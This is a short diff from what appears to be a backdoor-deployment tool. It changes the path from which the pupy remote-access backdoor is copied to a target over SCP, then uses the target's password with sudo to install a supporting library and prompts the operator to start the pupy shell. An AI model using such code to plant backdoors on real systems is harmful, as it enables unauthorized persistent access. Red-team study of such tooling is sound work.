@@ -23,7 +23,7 @@ class Pupy(Backdoor):
         print("Thanks to n1nj4sec for the pupy backdoor. Note that this script must be run with sudo.")        
 
         target.ssh.exec_command('rm -r pupy')
-        target.scpFiles(self, 'backdoors/pupy/pupy', True)
+        target.scpFiles(self, 'backdoors/shell/pupy/pupy', True)
         target.scpFiles(self, 'rpyc', True)
         target.ssh.exec_command("echo " + target.pword + " | sudo -S mv -f rpyc /usr/local/lib/python2.7/dist-packages")
         raw_input("Please navigate to the backdoors/pupy/pupy directory and run 'python pupysh.py'. Press enter when you are ready.")
